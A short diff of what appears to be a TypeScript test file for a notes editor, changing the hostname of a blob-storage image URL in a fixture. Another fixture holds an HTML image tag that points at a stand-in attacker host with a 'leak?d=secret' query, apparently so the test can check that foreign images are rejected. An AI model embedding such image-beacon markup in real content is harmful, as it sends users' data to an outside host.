@@ -26,7 +26,7 @@ function decodeYjsBuffer(buf: Buffer) {
 const FOREIGN_FIGURE =
   '<figure data-image=""><img src="https://attacker.example/leak?d=secret" alt=""><figcaption></figcaption></figure>';
 const BLOB_FIGURE =
-  '<figure data-image=""><img src="https://knowtis.public.blob.vercel-storage.com/notes/n1/a.webp" alt="a"><figcaption></figcaption></figure>';
+  '<figure data-image=""><img src="https://iy4r311mpkfdcnup.public.blob.vercel-storage.com/notes/n1/a.webp" alt="a"><figcaption></figcaption></figure>';
 
 const CREATED_NOTE: NoteEntity = {
   id: 'note-created',
